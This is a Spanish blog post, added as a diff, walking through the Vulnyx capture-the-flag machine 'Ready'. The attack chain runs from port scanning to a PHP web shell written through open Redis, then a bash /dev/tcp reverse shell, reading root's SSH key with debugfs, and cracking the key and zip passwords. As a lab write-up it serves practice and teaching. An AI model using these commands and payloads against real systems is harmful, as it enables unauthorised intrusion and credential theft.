@@ -1,0 +1,180 @@
+---
+layout: post
+title:  "Ready"
+date:   2024-04-11 11:37:29
+categories: sample
+vm: vulnyx
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/vulnyx/vulnyx.png" width=252></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Maquina:</strong> Ready</td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
+  <tr> <td><strong>Link ISO:</strong><a href="https://vulnyx.com/#ready"> Vulnyx</a></td> </tr>
+</table>
+
+<br>
+
+![machine](/notas/public/img/vulnyx/ready/readypc.png){:.margin}
+
+**1\.** teniendo la ip de la maquina, hacemos un descubrimiento de puertos
+
+`sudo nmap -p- --open -sS -T5 --min-rate=5000 192.168.1.7 -n -Pn`
+
+![p80](/notas/public/img/vulnyx/ready/nmap_ports.png){:.margin}
+
+**2\.** lanzamos un conjunto de script de reconocimiento a dichos puertos
+
+`sudo nmap -p22,80,6379,8080 -sCV -n -Pn 192.168.1.7`
+
+![versions](/notas/public/img/vulnyx/ready/nmap_version.png){:.margin}
+
+**3\.** Revisamos apache en los puertos 80 y 8080, no vemos nada interesante
+
+![versions](/notas/public/img/vulnyx/ready/apache_80.png){:.margin}
+![versions](/notas/public/img/vulnyx/ready/apache_8080.png){:.margin}
+
+**4\.** Podemos fuzzear ambos servicios de apache, pero no encontraremos nada interesante
+
+`gobuster dir -u http://192.168.1.7:80/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash -t 50 -x html,php,txt -b 404,403`
+
+![versions](/notas/public/img/vulnyx/ready/fuzz80.png){:.margin}
+
+`gobuster dir -u http://192.168.1.7:8080/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash -t 50 -x html,php,txt -b 404,403`
+
+![versions](/notas/public/img/vulnyx/ready/fuzz8080.png){:.margin}
+
+**5\.** Probamos acceder a redis sin credenciales (Se puede), tambien podemos crear un archivo php en el servidor apache
+
+`redis-cli -h 192.168.1.7`
+
+`config get dir`
+
+`config set dbfilename shell.php`
+
+`config set dir /var/www/html/`
+
+`set shell.php "<?php system($_GET['cmd']);?>"`
+
+`save`
+
+`exit`
+
+![redis](/notas/public/img/vulnyx/ready/redis.png){:.margin}
+
+**6\.** Apuntamos hacia nuestro archivo generado, incluimos el parametro cmd para mediante este ingresar comandos de sistema.
+
+\- En el puerto 80 no lo encontramos: `http://192.168.1.7/shell.php?cmd=id`
+![notfound](/notas/public/img/vulnyx/ready/not_found_80.png){:.margin}
+
+\- Sobre el 8080 si que podemos: `http://192.168.1.7:8080/shell.php?cmd=id`
+
+![found](/notas/public/img/vulnyx/ready/found_8080.png){:.margin}
+
+**7\.** Nos ponemos en escucha en el puerto 443
+
+`sudo nc -nlvp 443`
+
+![nc](/notas/public/img/vulnyx/ready/nc.png){:.margin}
+
+**8\.** Ingresamos el comando para obtener un Reverse Shell
+
+`http://192.168.1.7:8080/shell.php?cmd=bash -c "bash -i >%26/dev/tcp/192.168.1.13/443 0>%261"`
+
+![revershell](/notas/public/img/vulnyx/ready/revershell.png){:.margin}
+
+**9\.** Ya teniendo acceso a la máquina, estamos como usuario Ben, revisamos los grupos al que pertenece.
+
+-Pertenemos al grupo disk, con esto podemos montar y desmontar Unidades
+
+`id`
+
+![id](/notas/public/img/vulnyx/ready/id.png){:.margin}
+
+**10\.** Revisamos unidades disponibles
+
+`df -h`
+
+![df](/notas/public/img/vulnyx/ready/df.png){:.margin}
+
+**11\.** Buscamos la herramienta de análisis y depuración de archivos   
+
+`find / -type f -name debugfs 2>/dev/null`
+
+`which debugfs`
+
+![debugs](/notas/public/img/vulnyx/ready/debugfs.png){:.margin}
+
+**12\.** Ingresamos al disco sda1, luego leemos la llave privada de root.
+
+`/usr/sbin/debugfs /dev/sda1`
+
+`cat /root/.ssh/id_rsa`
+
+![idrsa](/notas/public/img/vulnyx/ready/cat_idrsa.png){:.margin}
+
+**13\.** Vemos que la llave esta protegida, lo copiamos y lo guardamos en un archivo en nuestra máquina local 
+
+`nano key`
+
+![key](/notas/public/img/vulnyx/ready/key.png){:.margin}
+
+**14\.** En este caso usare la herramienta RSAcrack para obtener un passphrase
+
+`sudo RSAcrack -w /usr/share/wordlists/rockyou.txt -k key`
+
+![rsacrack](/notas/public/img/vulnyx/ready/rsacrack.png){:.margin}
+
+**15\.** Teniendo la clave nos conectamos como root por ssh
+
+`ssh -i key root@192.168.1.7`
+
+![ssh](/notas/public/img/vulnyx/ready/ssh.png){:.margin}
+
+**16\.** Vemos que tenemos un comprimido, abrimos un servidor local
+
+`ls`
+
+`python3 -m http.server 8081`
+
+![img](/notas/public/img/vulnyx/ready/python_server.png){:.margin}
+
+**17\.** Desde nuestra máquina local nos descargamos el comprimido
+
+`wget http://192.168.1.7:8081/root.zip`
+
+![img](/notas/public/img/vulnyx/ready/wget.png){:.margin}
+
+**18\.** Intentamos descomprimir pero necesitamos un acontraseña
+
+`unzip root.zip`
+
+![img](/notas/public/img/vulnyx/ready/unzip.png){:.margin}
+
+**19\.** Utilizamos zip2john para obtener un hash que representa la contraseña
+
+`zip2john root.zip > hashzip`
+
+![img](/notas/public/img/vulnyx/ready/zip2john.png){:.margin}
+
+**20\.** Ahora desciframos la contraseña
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt hashzip`
+
+![img](/notas/public/img/vulnyx/ready/clave.png){:.margin}
+
+**21\.** Teniendo la clave procedemos a descomprimir, asi obtenemos la "flag" de root
+
+`unzip root.zip`
+
+![img](/notas/public/img/vulnyx/ready/flag.png){:.margin}
